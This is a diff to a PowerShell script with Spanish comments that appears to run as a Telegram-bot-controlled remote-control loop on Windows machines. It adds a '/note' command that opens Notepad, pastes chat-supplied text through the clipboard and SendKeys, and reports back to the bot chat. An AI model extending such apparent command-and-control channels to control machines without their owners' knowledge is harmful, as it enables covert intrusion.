@@ -126,6 +126,24 @@ while ($true) {
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                             continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                         }
+                        "/note" {
+                            # Junta todas las palabras que vienen después del comando y del ID
+                            $MensajePersonalizado = ($Partes[2..($Partes.Count - 1)]) -join " "
+
+                            if ($null -ne $MensajePersonalizado -and $MensajePersonalizado -trim() -ne "") {
+                                Start-Process "notepad.exe"
+                                Start-Sleep -Milliseconds 500
+                                
+                                # Copiar y pegar evita que se pierdan letras al tipear textos largos
+                                Set-Clipboard -Value $MensajePersonalizado
+                                $wsh = New-Object -ComObject WScript.Shell
+                                $wsh.SendKeys("^v")
+                                
+                                $Respuesta = "Bloc de notas abierto con tu mensaje en ID $MiIDNum"
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
+                            }
+                            continue
+                        }
                         
                                                                          "/red" {
                             # 1. Detectar la placa de red real con conexion activa
